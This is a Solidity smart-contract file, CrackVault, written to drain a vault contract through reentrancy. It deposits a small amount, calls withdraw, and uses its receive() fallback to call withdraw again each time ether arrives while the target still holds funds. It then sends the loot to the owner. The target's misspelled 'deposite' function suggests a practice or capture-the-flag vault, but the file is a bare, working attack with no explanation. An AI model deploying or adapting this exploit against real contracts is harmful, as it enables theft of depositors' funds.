// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Vault_withdraw {
    function withdraw() external;
    function deposite() external payable;
    function openWithdraw() external;
}

contract CrackVault {
    
    address public crack_addr;

    bytes crack_data;

    address public owner;

    modifier onlyOwner {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor(address _addr) public {
        crack_addr = _addr;
        crack_data = abi.encodeWithSelector(Vault_withdraw.withdraw.selector);
        owner = msg.sender;
    }

    receive() external payable {
        if (msg.sender == crack_addr && msg.sender.balance > 0) {
            Vault_withdraw(crack_addr).withdraw();
        }
    }

    function before_crack() public onlyOwner {
        Vault_withdraw(crack_addr).openWithdraw();
        Vault_withdraw(crack_addr).deposite{value: 0.01 ether}();
    }

    function start_crack() public onlyOwner {
        Vault_withdraw(crack_addr).withdraw();
    }

    function withdraw_after_crack() public onlyOwner {
        address payable pp = payable(msg.sender);
        pp.transfer(address(this).balance);
    }

    

}
